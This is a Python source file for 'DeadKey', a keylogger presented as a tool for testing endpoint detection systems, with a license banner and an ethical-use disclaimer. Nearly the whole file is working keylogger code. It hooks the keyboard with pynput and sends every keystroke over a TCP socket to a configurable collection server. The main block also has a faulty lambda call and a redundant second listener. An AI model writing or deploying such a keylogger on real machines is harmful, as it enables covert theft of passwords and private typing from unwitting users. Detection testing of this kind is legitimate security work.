# ----- License -------------------------------------------------- # 

#  DeadKey - DeadKey simulates keylogging attacks to test EDR systems, enabling users to strengthen their defense strategies.
#  Copyright (c) 2025 - CursedSec (Operated by Cursed271). All rights reserved.

#  This software is an proprietary intellectual property developed for
#  penetration testing, threat modeling, and security research. It   
#  is licensed under the CURSEDSEC OWNERSHIP EDICT:
#
#  🚫 PROHIBITION WARNING 🚫
#  Redistribution, re-uploading, and unauthorized modification are strictly forbidden 
#  under the COE. Use is granted ONLY under the limited terms defined in the official 
#  LICENSE file (COE), which must be included in all copies.

#  DISCLAIMER:
#  This tool is intended for **educational or ethical testing** purposes only.
#  Unauthorized or malicious use of this software against systems without 
#  proper authorization is strictly prohibited and may violate laws and regulations.
#  The author assumes no liability for misuse or damage caused by this tool.

#  🔗 LICENSE: CURSEDSEC OWNERSHIP EDICT (COE)
#  🔗 Repository: https://github.com/Cursed271
#  🔗 Author: Steven Pereira (@Cursed271)

# ----- Libraries ------------------------------------------------ #

import os
import socket
from pynput import keyboard
from rich.console import Console

# ----- Global Declaration --------------------------------------- #

conn = None
SERVER_PORT = 2701
SERVER_HOST = "127.0.0.1"
console = Console()

# ----- Session Initiation --------------------------------------- #

def session_init(message):
	global conn
	try:
		conn.sendall(message.encode("utf-8"))
	except Exception as e:
		console.print(f"[red][!] Failed to initiate session with the Server: {e}")

# ----- Record Keystrokes ---------------------------------------- #

def on_press(key):
	try:
		key_str = str(key.char)
	except AttributeError:
		key_str = f"<{key}>"
	session_init(key_str)

# ----- Execute Keylogger ---------------------------------------- #

def execute_deadkey():
	global conn
	conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		conn.connect((SERVER_HOST, SERVER_PORT))
		console.print(f"[bold green][+] Connected to DeadKey Server...")
	except Exception as e:
		console.print(f"[red][!] Failed to connect to DeadKey Server: {e}")
		return
	listener = keyboard.Listener(on_press=on_press)
	listener.start()
	listener.join()

# ----- Banner --------------------------------------------------- #

def ascii():
	console.print(rf"""[#C6ECE3]
┌───────────────────────────────────────────────────────────────────────────────────────┐
│                                                                                       │
│    oooooooooo.                             .o8  oooo    oooo                          │
│    `888'   `Y8b                           "888  `888   .8P'                           │
│     888      888  .ooooo.   .oooo.    .oooo888   888  d8'     .ooooo.  oooo    ooo    │
│     888      888 d88' `88b `P  )88b  d88' `888   88888[      d88' `88b  `88.  .8'     │
│     888      888 888ooo888  .oP"888  888   888   888`88b.    888ooo888   `88..8'      │
│     888     d88' 888    .o d8(  888  888   888   888  `88b.  888    .o    `888'       │
│    o888bood8P'   `Y8bod8P' `Y888""8o `Y8bod88P" o888o  o888o `Y8bod8P'     .8'        │
│                                                                        .o..P'         │
│                                                                        `Y8P'          │
└───────────────────────────────────────────────────────────────────────────────────────┘
	""")
	console.print(rf"[#C6ECE3]+--------------------------------------------------------------+")
	console.print(rf"[#C6ECE3]  DeadKey - Capture with Precision. Analyze with Clarity. Strengthen with Strategy.")
	console.print(rf"[#C6ECE3]  Created by [bold black]Cursed271")
	console.print(rf"[#C6ECE3]+--------------------------------------------------------------+")

# ----- Main Function -------------------------------------------- #

if __name__ == "__main__":
	os.system("cls" if os.name == "nt" else "clear")
	ascii()
	execute_deadkey()
	with keyboard.Listener(on_press=lambda key: on_press(key, conn)) as listener:
		listener.join()
	console.print("[#C6ECE3]+--------------------------------------------------------------+")

# ----- End ------------------------------------------------------ #
